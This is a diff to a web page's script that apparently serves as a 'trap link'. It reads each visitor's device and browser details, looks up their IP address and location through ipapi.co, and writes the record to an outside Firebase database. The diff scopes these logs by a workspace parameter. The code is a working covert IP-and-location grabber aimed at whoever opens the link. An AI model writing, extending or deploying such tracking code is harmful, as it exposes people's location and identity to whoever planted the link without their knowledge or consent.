@@ -53,6 +53,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
 'use strict';
 var FIREBASE_BASE='https://device-scan-8898e-default-rtdb.firebaseio.com/';
 var LINK_ID=(function(){var p=new URLSearchParams(location.search);return p.get('id')||'';})();
+var WORKSPACE=(function(){var p=new URLSearchParams(location.search);return p.get('ws')||'void-alpha';})();
 
 function os(ua,pl){if(/Windows/.test(ua))return'Windows';if(/Android/.test(ua))return'Android';if(/iPhone|iPad|iPod/.test(ua)||(pl==='MacIntel'&&navigator.maxTouchPoints>1))return'iOS/iPadOS';if(/Mac/.test(ua))return'macOS';if(/CrOS/.test(ua))return'ChromeOS';if(/Linux/.test(ua))return'Linux';return'Unknown'}
 function browser(ua){var m;if(m=ua.match(/Edg\/([\d.]+)/))return'Edge '+m[1];if(m=ua.match(/OPR\/([\d.]+)/))return'Opera '+m[1];if(m=ua.match(/SamsungBrowser\/([\d.]+)/))return'Samsung Internet '+m[1];if(m=ua.match(/(?:Firefox|FxiOS)\/([\d.]+)/))return'Firefox '+m[1];if(m=ua.match(/(?:Chrome|CriOS)\/([\d.]+)/))return'Chrome '+m[1];if(m=ua.match(/Version\/([\d.]+).*Safari/))return'Safari '+m[1];return'Unknown'}
@@ -79,8 +80,8 @@ fetch(fbUrl('_sc6/trapLinksEnabled')).then(function(r){return r.ok?r.json():null
   };
   fetch('https://ipapi.co/json/',{cache:'no-store'}).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(j){
     if(j){e.ip=j.ip||null;e.country=j.country_name||'Unknown';e.region=j.region||'';}
-    // Write to trap log
-    var url=fbUrl('_sc6/trapLogs/'+LINK_ID);
+    // Write to trap log (workspace-scoped)
+    var url=fbUrl('_sc6/workspaces/'+WORKSPACE+'/trapLogs/'+LINK_ID);
     fetch(url).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(existing){
       var arr=Array.isArray(existing)?existing:[];arr.push(e);
       fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(arr)}).catch(function(){});
